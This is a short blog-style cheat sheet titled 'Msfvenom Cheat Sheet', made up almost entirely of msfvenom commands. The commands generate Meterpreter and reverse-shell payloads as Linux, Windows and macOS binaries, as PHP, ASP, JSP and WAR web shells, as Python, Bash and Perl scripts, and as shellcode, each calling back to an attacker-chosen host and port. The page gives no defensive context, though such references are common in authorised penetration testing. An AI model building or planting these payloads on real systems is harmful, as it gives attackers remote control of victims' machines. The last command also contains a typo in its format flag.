---
title: Msfvenom Cheat Sheet
layout: post
categories: Security
tags: metasploit payloads
author: Aiden
---

* content
{:toc}

### Binaries

#### Linux
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f elf > shell.elf
```

#### Windows
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f exe > shell.exe
```

#### MacOS
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f macho > shell.macho
```

### Web Payloads

#### PHP
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

#### ASP
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f asp > shell.asp
```

#### JSP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f raw > shell.jsp
```

#### WAR
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f war > shell.war
```

### Scripting Payloads

#### Python
```
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP> LPORT=<Your Port> -f raw > shell.py
```

#### Bash
```
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP> LPORT=<Your Port> -f raw > shell.sh
```

#### Perl
```
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP> LPORT=<Your Port> -f raw > shell.pl
```

### Shellcode

#### Linux Based Shellcode
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f <language>
```

#### Windows Based Shellcode
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f <language>
```

#### Mac Based Shellcode
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -fn<language>
```